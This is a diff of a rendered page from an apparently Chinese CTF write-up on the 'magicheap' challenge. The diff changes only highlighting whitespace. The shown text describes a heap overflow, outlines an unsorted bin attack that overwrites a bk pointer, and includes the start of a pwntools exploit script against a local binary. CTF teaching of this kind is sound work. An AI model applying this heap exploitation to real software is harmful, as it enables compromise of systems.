@@ -133,12 +133,12 @@ magicheap:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>
 <span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
 </code></pre></div> <p>可以看出，该程序是一个动态链接的64程序，主要开启了 NX 保护与 Canary 保护。</p> <h3 id=_5>基本功能<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <p>程序大概就是自己写的堆管理器，主要有以下功能</p> <ol> <li>创建堆。根据用户指定大小申请相应堆，并且读入指定长度的内容，但是并没有设置 NULL。</li> <li>编辑堆。根据指定的索引判断对应堆是不是非空，如果非空，就根据用户读入的大小，来修改堆的内容，这里其实就出现了任意长度堆溢出的漏洞。</li> <li>删除堆。根据指定的索引判断对应堆是不是非空，如果非空，就将对应堆释放并置为 NULL。</li> </ol> <p>同时，我们看到，当我们控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 了。</p> <h3 id=_6>利用<a class=headerlink href=#_6 title="Permanent link">&para;</a></h3> <p>很显然， 我们直接利用 unsorted bin attack 即可。</p> <ol> <li>释放一个堆块到 unsorted bin 中。</li> <li>利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &amp;magic-16。</li> <li>触发漏洞即可。</li> </ol> <p>代码如下</p> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
 <span class=c1># -*- coding: utf-8 -*-</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./magicheap&#39;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>create_heap</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>create_heap</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&quot;1&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
@@ -147,7 +147,7 @@ magicheap:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>edit_heap</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>edit_heap</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&quot;2&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
@@ -158,7 +158,7 @@ magicheap:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>del_heap</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>del_heap</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&quot;3&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
